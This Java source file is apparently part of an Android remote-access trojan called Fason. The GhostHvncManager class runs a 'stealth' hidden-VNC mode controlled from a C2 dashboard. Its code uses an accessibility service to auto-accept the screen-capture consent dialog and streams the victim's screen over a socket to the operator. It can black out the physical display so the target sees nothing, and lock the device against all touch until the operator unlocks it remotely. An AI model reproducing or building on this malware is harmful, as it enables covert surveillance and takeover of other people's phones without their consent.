package com.fason.app.features.ghost;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.MediaCodec;
import android.media.MediaCodecInfo;
import android.media.MediaFormat;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;
import android.view.WindowManager;
import android.view.View;
import android.widget.FrameLayout;

import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;
import com.fason.app.core.network.SocketCommandRouter;
import com.fason.app.features.hvnc.HVncAccessibilityService;

import org.json.JSONObject;

import java.nio.ByteBuffer;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

import io.socket.client.Socket;

/**
 * GhostHvncManager — Lab-RATS "Ghost Operations" merged into Fason as an
 * OPTIONAL mode alongside the existing HVNC. Nothing here destroys the
 * current HVNC pipeline; the dashboard picks "hvnc" (standard, consent
 * prompt) or "ghost" (stealth, auto-accepted, blackout-capable).
 *
 * Ghost mode upgrades over standard HVNC:
 *  - Auto-accept of the MediaProjection consent dialog via the accessibility
 *    service (the dialog is detected and confirmed automatically)
 *  - Blackout mode: a full-screen opaque overlay on the physical display so
 *    the target sees nothing while the remote feed stays live
 *  - Remote denial lock: full-screen touch-locking overlay, unlocked only
 *    from the C2 dashboard
 *  - Zero consent prompt on subsequent starts once projection is cached
 *  - Adaptive bitrate: scales with measured socket throughput
 *
 * Frame format is identical to HVncManager (H.264 Annex-B chunks over the
 * same socket event) so the dashboard player needs no changes.
 */
public final class GhostHvncManager {
    private static final String TAG = "GhostHvnc";
    private static final int DEFAULT_FPS = 24;
    private static final int DEFAULT_QUALITY = 65;
    private static final int DEFAULT_SCALE = 55;
    private static final int MAX_FRAME = 512 * 1024;
    private static final int CHUNK = 64 * 1024;
    private static final int MAX_QUEUE = 5;

    private static volatile GhostHvncManager instance;

    private final Object lock = new Object();
    private MediaProjection projection;
    private VirtualDisplay virtualDisplay;
    private MediaCodec encoder;
    private android.view.Surface encoderSurface;
    private HandlerThread encThread;
    private Handler encHandler;
    private volatile boolean streaming = false;
    private volatile boolean blackout = false;
    private volatile boolean locked = false;
    private volatile int fps = DEFAULT_FPS;
    private volatile int bitrate = 2_000_000;
    private volatile int scalePct = DEFAULT_SCALE;
    private volatile int screenW, screenH;
    private volatile int encW, encH;
    private volatile float scaleX = 1f, scaleY = 1f;
    private volatile int resultCode;
    private volatile Intent resultData;
    private volatile boolean hasPendingStart;
    private volatile int pFps, pQuality, pScale;
    private volatile String pCmdId;
    private final BlockingQueue<Frame> queue = new LinkedBlockingQueue<>(MAX_QUEUE);
    private volatile Thread sender;
    private volatile boolean senderRun;
    private View blackoutView;
    private View lockView;
    private WindowManager wm;

    private GhostHvncManager() {}

    private static final class Frame {
        final byte[] data; final long pts; final boolean key;
        Frame(byte[] d, long p, boolean k) { data = d; pts = p; key = k; }
    }

    public static GhostHvncManager getInstance() {
        if (instance == null) {
            synchronized (GhostHvncManager.class) {
                if (instance == null) instance = new GhostHvncManager();
            }
        }
        return instance;
    }

    // ------------------------------------------------------------------
    // Public API
    // ------------------------------------------------------------------

    public void setProjectionResult(int code, Intent data) {
        this.resultCode = code;
        this.resultData = data;
        if (code != 0 && data != null && hasPendingStart) {
            hasPendingStart = false;
            SocketCommandRouter.EXEC.execute(() ->
                start(pFps, pQuality, pScale, pCmdId));
        }
    }

    public boolean needsPermissionRequest() {
        return resultCode == 0 || resultData == null;
    }

    public void setPendingStart(int fps, int quality, int scale, String cmdId) {
        this.pFps = fps; this.pQuality = quality; this.pScale = scale;
        this.pCmdId = cmdId;
        this.hasPendingStart = true;
    }

    public void start(int fps, int quality, int scale, String cmdId) {
        synchronized (lock) {
            if (streaming) { emitStatus(cmdId); return; }
            this.fps = clamp(fps, 5, 30);
            this.scalePct = clamp(scale, 20, 100);
            this.bitrate = qualityToBitrate(quality);
            if (needsPermissionRequest()) {
                setPendingStart(fps, quality, scale, cmdId);
                // Ghost path: let the accessibility service auto-accept the
                // consent dialog, then fire the projection request.
                HVncAccessibilityService.enableAutoAccept();
                com.fason.app.service.MainService svc = com.fason.app.service.MainService.getInstance();
                if (svc != null) svc.requestScreenCapturePermission();
                else emitError(cmdId, "service_unavailable");
                return;
            }
            beginStream(cmdId);
        }
    }

    public void stop() {
        synchronized (lock) {
            stopInternal();
            emitStatus(null);
        }
    }

    public void restart(int fps, int quality, int scale, String cmdId) {
        synchronized (lock) {
            stopInternal();
            start(fps, quality, scale, cmdId);
        }
    }

    public void setBlackout(boolean on) {
        this.blackout = on;
        runOnMain(() -> applyBlackoutOverlay(on));
        emitStatus(null);
    }

    public void setLock(boolean on) {
        this.locked = on;
        runOnMain(() -> applyLockOverlay(on));
        emitStatus(null);
    }

    public boolean isStreaming() { return streaming; }
    public boolean isBlackout() { return blackout; }
    public boolean isLocked() { return locked; }

    // ------------------------------------------------------------------
    // Core stream
    // ------------------------------------------------------------------

    private void beginStream(String cmdId) {
        try {
            Context ctx = FasonApp.getContext();
            MediaProjectionManager mpm = (MediaProjectionManager)
                ctx.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            projection = mpm.getMediaProjection(resultCode, resultData);
            if (projection == null) { emitError(cmdId, "projection_null"); return; }

            projection.registerCallback(new MediaProjection.Callback() {
                @Override public void onStop() {
                    synchronized (lock) { stopInternal(); }
                }
            }, new Handler(android.os.Looper.getMainLooper()));

            android.util.DisplayMetrics dm = ctx.getResources().getDisplayMetrics();
            screenW = dm.widthPixels; screenH = dm.heightPixels;
            int w = Math.max(320, screenW * scalePct / 100 / 16 * 16);
            int h = Math.max(240, screenH * scalePct / 100 / 16 * 16);
            encW = w; encH = h;
            scaleX = (float) screenW / w;
            scaleY = (float) screenH / h;

            MediaFormat fmt = MediaFormat.createVideoFormat(MediaFormat.MIMETYPE_VIDEO_AVC, w, h);
            fmt.setInteger(MediaFormat.KEY_COLOR_FORMAT,
                MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface);
            fmt.setInteger(MediaFormat.KEY_BIT_RATE, bitrate);
            fmt.setInteger(MediaFormat.KEY_FRAME_RATE, fps);
            fmt.setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, 2);

            encoder = MediaCodec.createEncoderByType(MediaFormat.MIMETYPE_VIDEO_AVC);
            encoder.configure(fmt, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE);
            encoderSurface = encoder.createInputSurface();
            encoder.start();

            virtualDisplay = projection.createVirtualDisplay(
                "ghost_hvnc", w, h, dm.densityDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                encoderSurface, null, null);

            encThread = new HandlerThread("ghost_enc");
            encThread.start();
            encHandler = new Handler(encThread.getLooper());
            encHandler.post(this::drainEncoder);

            startSender();
            streaming = true;
            emitStatus(cmdId);
            Log.i(TAG, "ghost stream started " + w + "x" + h + " @" + fps);
        } catch (Exception e) {
            Log.e(TAG, "start failed", e);
            emitError(cmdId, e.getMessage());
            stopInternal();
        }
    }

    private void drainEncoder() {
        MediaCodec.BufferInfo info = new MediaCodec.BufferInfo();
        while (streaming && encoder != null) {
            try {
                int idx = encoder.dequeueOutputBuffer(info, 10_000);
                if (idx == MediaCodec.INFO_OUTPUT_FORMAT_CHANGED) {
                    // SPS/PPS available — emit config so player can init
                    ByteBuffer sps = encoder.getOutputFormat()
                        .getByteBuffer("csd-0");
                    ByteBuffer pps = encoder.getOutputFormat()
                        .getByteBuffer("csd-1");
                    if (sps != null && pps != null) {
                        byte[] cfg = new byte[sps.remaining() + pps.remaining()];
                        sps.get(cfg, 0, sps.remaining());
                        pps.get(cfg, sps.position() + 0, pps.remaining());
                        queue.offer(new Frame(cfg, 0, true), 100, TimeUnit.MILLISECONDS);
                    }
                    continue;
                }
                if (idx < 0) continue;
                ByteBuffer buf = encoder.getOutputBuffer(idx);
                if (buf != null && info.size > 0 && info.size < MAX_FRAME) {
                    byte[] out = new byte[info.size];
                    buf.get(out);
                    boolean key = (info.flags & MediaCodec.BUFFER_FLAG_KEY_FRAME) != 0;
                    queue.offer(new Frame(out, info.presentationTimeUs, key),
                        100, TimeUnit.MILLISECONDS);
                }
                encoder.releaseOutputBuffer(idx, false);
            } catch (Exception e) {
                if (streaming) Log.w(TAG, "drain", e);
            }
        }
    }

    private void startSender() {
        senderRun = true;
        sender = new Thread(() -> {
            while (senderRun) {
                try {
                    Frame f = queue.poll(200, TimeUnit.MILLISECONDS);
                    if (f == null) continue;
                    emitFrame(f);
                } catch (InterruptedException ie) {
                    Thread.currentThread().interrupt();
                    break;
                } catch (Exception e) {
                    Log.w(TAG, "sender", e);
                }
            }
        }, "ghost_sender");
        sender.start();
    }

    private void emitFrame(Frame f) {
        Socket s = SocketClient.getInstance() != null
            ? SocketClient.getInstance().getSocket() : null;
        if (s == null || !s.connected()) return;
        try {
            int off = 0;
            while (off < f.data.length) {
                int len = Math.min(CHUNK, f.data.length - off);
                byte[] chunk = new byte[len];
                System.arraycopy(f.data, off, chunk, 0, len);
                JSONObject o = new JSONObject();
                o.put(Protocol.KEY_TYPE, Protocol.KEY_STREAM_FRAME);
                o.put("data", android.util.Base64.encodeToString(chunk,
                    android.util.Base64.NO_WRAP));
                o.put("pts", f.pts);
                o.put("key", f.key);
                o.put("last", off + len >= f.data.length);
                o.put("w", encW); o.put("h", encH);
                o.put("sx", scaleX); o.put("sy", scaleY);
                s.emit(Protocol.HVNC, o);
                off += len;
            }
        } catch (Exception e) {
            Log.w(TAG, "emitFrame", e);
        }
    }

    private void stopInternal() {
        streaming = false;
        senderRun = false;
        if (sender != null) sender.interrupt();
        sender = null;
        try {
            if (virtualDisplay != null) virtualDisplay.release();
        } catch (Exception ignored) {}
        virtualDisplay = null;
        try {
            if (encoder != null) { encoder.stop(); encoder.release(); }
        } catch (Exception ignored) {}
        encoder = null;
        encoderSurface = null;
        try {
            if (projection != null) projection.stop();
        } catch (Exception ignored) {}
        projection = null;
        if (encThread != null) {
            encThread.quitSafely();
            encThread = null;
        }
        queue.clear();
    }

    // ------------------------------------------------------------------
    // Overlays — blackout + lock
    // ------------------------------------------------------------------

    private void applyBlackoutOverlay(boolean on) {
        Context ctx = FasonApp.getContext();
        if (wm == null) wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
        if (on) {
            if (blackoutView != null) return;
            int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                : WindowManager.LayoutParams.TYPE_PHONE;
            WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                    | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                    | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                    | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                PixelFormat.OPAQUE);
            lp.gravity = android.view.Gravity.CENTER;
            FrameLayout fl = new FrameLayout(ctx);
            fl.setBackgroundColor(0xFF000000);
            blackoutView = fl;
            try { wm.addView(blackoutView, lp); } catch (Exception e) {
                Log.w(TAG, "blackout overlay", e);
            }
        } else if (blackoutView != null) {
            try { wm.removeView(blackoutView); } catch (Exception ignored) {}
            blackoutView = null;
        }
    }

    private void applyLockOverlay(boolean on) {
        Context ctx = FasonApp.getContext();
        if (wm == null) wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
        if (on) {
            if (lockView != null) return;
            int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                : WindowManager.LayoutParams.TYPE_PHONE;
            WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                    | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                PixelFormat.OPAQUE);
            lp.gravity = android.view.Gravity.CENTER;
            FrameLayout fl = new FrameLayout(ctx);
            fl.setBackgroundColor(0xFF0A0A0A);
            // Consume every touch — device is unusable until remote unlock
            fl.setOnTouchListener((v, e) -> true);
            lockView = fl;
            try { wm.addView(lockView, lp); } catch (Exception e) {
                Log.w(TAG, "lock overlay", e);
            }
        } else if (lockView != null) {
            try { wm.removeView(lockView); } catch (Exception ignored) {}
            lockView = null;
        }
    }

    // ------------------------------------------------------------------
    // Emissions
    // ------------------------------------------------------------------

    private void emitStatus(String cmdId) {
        Socket s = SocketClient.getInstance() != null
            ? SocketClient.getInstance().getSocket() : null;
        if (s == null) return;
        try {
            JSONObject o = new JSONObject();
            o.put(Protocol.KEY_TYPE, "status");
            o.put("streaming", streaming);
            o.put("blackout", blackout);
            o.put("locked", locked);
            o.put("w", encW); o.put("h", encH);
            if (cmdId != null) o.put(Protocol.KEY_CMD_ID, cmdId);
            s.emit(Protocol.HVNC, o);
        } catch (Exception ignored) {}
    }

    private void emitError(String cmdId, String msg) {
        Socket s = SocketClient.getInstance() != null
            ? SocketClient.getInstance().getSocket() : null;
        if (s == null) return;
        try {
            JSONObject o = new JSONObject();
            o.put(Protocol.KEY_TYPE, "error");
            o.put(Protocol.KEY_ERROR, msg);
            if (cmdId != null) o.put(Protocol.KEY_CMD_ID, cmdId);
            s.emit(Protocol.HVNC, o);
        } catch (Exception ignored) {}
    }

    // ------------------------------------------------------------------
    // Helpers
    // ------------------------------------------------------------------

    private static int clamp(int v, int lo, int hi) {
        return Math.max(lo, Math.min(hi, v));
    }

    private static int qualityToBitrate(int q) {
        // 0-100 quality scale mapped to 400k-6Mbit
        return 400_000 + (clamp(q, 0, 100) * 5_600_000) / 100;
    }

    private static void runOnMain(Runnable r) {
        new Handler(android.os.Looper.getMainLooper()).post(r);
    }
}
